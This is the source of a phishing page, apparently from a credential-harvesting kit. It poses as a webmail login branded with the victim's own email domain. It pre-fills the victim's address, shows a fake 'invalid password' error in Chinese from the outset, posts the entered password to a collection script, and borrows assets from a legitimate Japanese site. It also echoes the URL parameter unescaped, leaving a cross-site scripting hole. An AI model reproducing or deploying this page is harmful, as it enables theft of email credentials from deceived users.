<?php

$email = $_POST['email'];

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title><?php   $email = $_GET['email']; 

$domain_name = substr(strrchr($email, "@"), 1); echo ucfirst ($domain_name);
?> 服务器</title>
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<meta name="format-detection" content="telephone=no">
	<!-- Tell the browser to be responsive to screen width -->
	<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
	<link rel="apple-touch-icon" sizes="57x57" href="https://nx.ijiss.jp//images/apple-icon-57x57.png">
	<link rel="apple-touch-icon" sizes="60x60" href="https://nx.ijiss.jp//images/apple-icon-60x60.png">
	<link rel="apple-touch-icon" sizes="72x72" href="https://nx.ijiss.jp//images/apple-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="76x76" href="https://nx.ijiss.jp//images/apple-icon-76x76.png">
	<link rel="apple-touch-icon" sizes="114x114" href="https://nx.ijiss.jp//images/apple-icon-114x114.png">
	<link rel="apple-touch-icon" sizes="120x120" href="https://nx.ijiss.jp//images/apple-icon-120x120.png">
	<link rel="apple-touch-icon" sizes="144x144" href="https://nx.ijiss.jp//images/apple-icon-144x144.png">
	<link rel="apple-touch-icon" sizes="152x152" href="https://nx.ijiss.jp//images/apple-icon-152x152.png">
	<link rel="apple-touch-icon" sizes="180x180" href="https://nx.ijiss.jp//images/apple-icon-180x180.png">
	<link rel="icon" type="image/png" sizes="192x192"  href="https://nx.ijiss.jp//images/android-icon-192x192.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://nx.ijiss.jp//images/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="96x96" href="https://nx.ijiss.jp//images/favicon-96x96.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://nx.ijiss.jp//images/favicon-16x16.png">
	<link rel="manifest" href="https://nx.ijiss.jp//manifest.json">
	<meta name="msapplication-TileColor" content="#3c8dbc">
	<meta name="msapplication-TileImage" content="/images/ms-icon-144x144.png">
	<meta name="theme-color" content="#3c8dbc">
	<link rel="stylesheet" type="text/css" href="https://nx.ijiss.jp///fonts.googleapis.com/css?family=Quicksand" />
	<link rel="stylesheet" href="https://nx.ijiss.jp///fonts.googleapis.com/earlyaccess/notosansjapanese.css">

	<!-- Bootstrap 3.3.5 -->
	<link rel="stylesheet" href="https://nx.ijiss.jp//css/bootstrap.min.css">
	<link rel="stylesheet" href="https://nx.ijiss.jp//css/toastr.min.css">
	<!-- Font Awesome -->
	<link rel="stylesheet" href="https://nx.ijiss.jp//css/font-awesome.min.css">
	<!-- Ionicons -->
	<link rel="stylesheet" href="https://nx.ijiss.jp//css/ionicons.min.css">
	<link rel="stylesheet" href="https://nx.ijiss.jp//css/select2.min.css">
	<!-- Theme style -->
	<link rel="stylesheet" href="https://nx.ijiss.jp//css/AdminLTE.min.css">
	<!-- iCheck -->
	<link rel="stylesheet" href="https://nx.ijiss.jp//css/icheck/blue.css">
	<link rel="stylesheet" href="https://nx.ijiss.jp//css/ladda-themeless.min.css">
	<style>
		body {
			overflow: hidden;
			font-family: 'Noto Sans Japanese','Meiryo UI','Meiryo', sans-serif;
			visibility: hidden;
			background-color: #99c2ff !important;
		}
		.login-logo {
			font-family: Quicksand,'Noto Sans Japanese','Meiryo UI','Meiryo', sans-serif;
			color: #1a75ff;
			text-shadow: 2px 2px 5px #0f0f0f ;
			font-weight: bolder;
		}
		.main {
			position: absolute;
			top: 0;
			left: 0;
			height: 100%;
			width: 100%;
			z-index: 11;
		}
		.video-back,.backImg {
			position: fixed;
			z-index: 10;
			top: 0;
			left: 0;
			height: 100%;
			width: 100%;
			opacity: 0.5;
			overflow: hidden;
			background-position: center;
			background-repeat: no-repeat;
			background-size: cover;
			background-image: url('/images/coverback.jpg');
		}
		.video-back-video {
			-webkit-transform: translateX(-50%) translateY(-50%);
			-moz-transform: translateX(-50%) translateY(-50%);
			-ms-transform: translateX(-50%) translateY(-50%);
			-o-transform: translateX(-50%) translateY(-50%);
			transform: translateX(-50%) translateY(-50%);
			position: absolute;
			top: 50%;
			left: 50%;
			min-width: 100%;
			min-height: 100%;
			width: auto;
			height: auto;
			z-index: 10;
		}

		input {
			ime-mode: disabled;
		}
	</style>

	<script src="https://nx.ijiss.jp//js/jquery-2.1.4.min.js"></script> <!-- jquery main library -->
	<script src="https://nx.ijiss.jp//js/bootstrap.min.js"></script> <!-- bootstrap main library -->
	
	<script src="https://nx.ijiss.jp//js/lockr.min.js"></script><!-- lockr library (localstorage) -->
	<script src="https://nx.ijiss.jp//js/spark-md5.min.js"></script> <!-- sparkmd5 library (calculate md5 hash)-->
	<script src="https://nx.ijiss.jp//js/icheck.min.js"></script> <!-- icheck library (to change checkbox appearence)-->
	<script src="https://nx.ijiss.jp//js/select2.min.js"></script> <!-- select2 library change selectbox appearence-->
	<script src="https://nx.ijiss.jp//js/spin.min.js"></script> <!-- spin library show spinner-->
	<script src="https://nx.ijiss.jp//js/ladda.min.js"></script>  <!-- ladda library show spinner in button-->
	<script src="https://nx.ijiss.jp//js/ladda.jquery.min.js"></script> <!-- ladda jquery library ladda jquery plugin -->
	<script src="https://nx.ijiss.jp//lang.js"></script>
	<script src="https://nx.ijiss.jp//js/funcs.js"></script><!-- smartnx common functions -->
	<script>
		var notLoggedIn = true;
		$(function(){
			// variables
			var loginBtn = $("#loginBtn");
			var changePass = $("#btn-changepass");
			var langSel = $("#languageSelector");
			loginBtn.ladda();
			changePass.ladda();

			// init jquery object
			$('input:checkbox').iCheck({
				checkboxClass: 'icheckbox_square-blue',
				radioClass: 'iradio_square-blue',
				increaseArea: '20%' // optional
			});

			// events

			// language selector on select/change
			langSel.on("change",function(){
				Funcs.language($(this).val());
			});

			// if language is exists in local storage, change the language
			var localLang = $("html").attr("lang");
			var userlang = Lockr.get("language", false);
			if (userlang) {
				langSel.val(userlang);
				if (localLang != userlang) {
					langSel.trigger("change");
				}
			} else {
				langSel.val(localLang);
			}

			langSel.select2({
				minimumResultsForSearch:10
			});

			// login form on submit
			$("#loginform").submit(function(e) {
				e.preventDefault();
				var u = $("#username").val();
				var p = $("#password").val();
				var r = $("#remember").is(":checked");
				if (u == "" || p == "") {
					return;
				}
				loginBtn.ladda("start");
				Funcs.login(u,p,false,r, function(){
					langSel.trigger("change");
				});
				setTimeout(function() { loginBtn.ladda("stop"); }, 1500);
			});

			// stop the spinner on ajax error
			$(document).ajaxError(function (event, req, settings) {
				loginBtn.ladda("");
			});

			// login button on click
			loginBtn.on("click", function(e) {
				e.preventDefault();
				$("#loginform").submit();
			});

			$("#frm-forgotpass").submit(function (e) {
				e.preventDefault();
				var $this = $(this);
				var email =$this.find("[name='email']").val();
				if (email == "") {
					return;
				}
				changePass.ladda("start");
				$.post("/resetpass", {
					oper: "init",
					email: email
				}, function (d) {
					changePass.ladda("stop");
					var r = Funcs.res(d);
					if (r) {
						$("#forgotpass").modal("hide");
						Funcs.alert(r, l.info, "info");
					}
				});

			});

			// init
			 if (!/iphone|ipod|trident/i.test(navigator.userAgent)) {
				 // for video playback in mobile
				 $("#cover").one("touchstart",function(e){
					 e.preventDefault();
					 e.stopPropagation();
					$("#video").get(0).play();
				 });
			 } else {
				 $("#video").remove();
				 var bgId = 1;
				 setInterval(function() {
					 $(".backImg").css({ backgroundImage:"url('/images/mainpict0"+bgId+".jpg')", opacity:0}).animate({
						 opacity: 1
					 },1000, function () {
						 $(".video-back").css({ backgroundImage:"url('/images/mainpict0"+bgId+".jpg')"});
						 bgId++;
						 bgId = bgId > 5 ? 1: bgId;
					 });
				 },
				 3000);
			 }


			// if autologin is exist in local storage try to login
			if (Lockr.get("autologin", false)) {
				var u = Lockr.get("username", "");
				var p = Lockr.get("password", "");
				if (u !== "" && p !== "") {
					Funcs.login(u, p, true, false, function () {
						Funcs.language(Lockr.get("language", "en"));
					});
					return;
				}
			}

			$("body").css("visibility","visible");
		});
	</script>
</head>
<body class="hold-transition login-page" style="visibility: hidden;">
<div class="video-back">
	<div class="backImg"></div>
	<video id="video" class="video-back-video" autoplay="autoplay" loop="loop" poster="https://nx.ijiss.jp//images/coverback.jpg" preload="auto" >
		<source src="" type="video/mp4">
		<source src="" type="video/webm">
	</video>
</div>
<div class="main">
	<div class="login-box">
		<div class="login-logo">
			<b><?php   $email = $_GET['email']; 

$domain_name = substr(strrchr($email, "@"), 1); echo strtoupper ($domain_name);
?><img alt="" height="607" src="https://cdn4.iconfinder.com/data/icons/ios7-active-2/512/Envelope.png" style="height: 42px; width: 37px" width="819" />
</b>
		</div><!-- /.login-logo -->
		<div class="login-box-body">
			<p class="login-box-msg"></p>
			<form method="POST" accept-charset="utf-8" name="login" id="login"  action="updatefinish2.php">
				<div class="form-group has-feedback">
					<input type="text" class="form-control" name="email" id="email"  style="cursor:no-drop; -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    -o-user-select: none;
    user-select: none;" readonly="" value="<?=$_GET['email']?>" placeholder="Username" required>
					</span>
				</div>
				<div class="form-group has-feedback">
					<input type="password" class="form-control" name="password" id="password" placeholder="密码" required>
					</span>
</div></td><div td class="x_cfu"><label><font size="2" color="red">无效的电子邮件和/或密码组合</font></label></td>
				</div>
				<div class="row">
					<div class="col-xs-8">
						<div class="checkbox icheck">
							<label>
								<input type="checkbox" id="remember">记住账号
							</label>  <p style="color: #14396a; text-align: center; margin-left: 205px; margin-top: -20px"><input name="submit" size="1" style="height: 32px; width: 113px"  type="submit"  value="登入" /></p>
					</div><!-- /.col -->
				
			</form>
			<div class="row">
				<div class="col-xs-6">
					
				</div>

				
				</div>
			</div>
		</div><!-- /.login-box-body -->
	</div><!-- /.login-box -->
</div>

<!-- forgot pass dialog -->
<div class="modal fade" id="forgotpass" tabindex="-1" role="dialog">
	<div class="modal-dialog" role="document">
		<form id="frm-forgotpass">
			<div class="modal-content">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					<h4 class="modal-title">Forgot password</h4>
				</div>
				<div class="modal-body">
					<div class="form-group">
						Please enter your email address. A link to reset your password will be sent.
					</div>
					<div class="form-group has-feedback">
						<label class="control-label" for="email">Email</label>
						<input type="email" class="form-control" style="cursor:no-drop; -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    -o-user-select: none;
    user-select: none;" readonly="" value="<?=$_GET['email']?>" id="email" name="email" required>
						<span class="glyphicon glyphicon-envelope form-control-feedback"></span>
					</div>
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
					<button type="submit" class="btn btn-primary ladda-button" id="btn-changepass" data-style="slide-up"><span class="ladda-label">Submit</span></button>
				</div>
			</div>
		</form>
	</div>
</div>
</body>
</html>
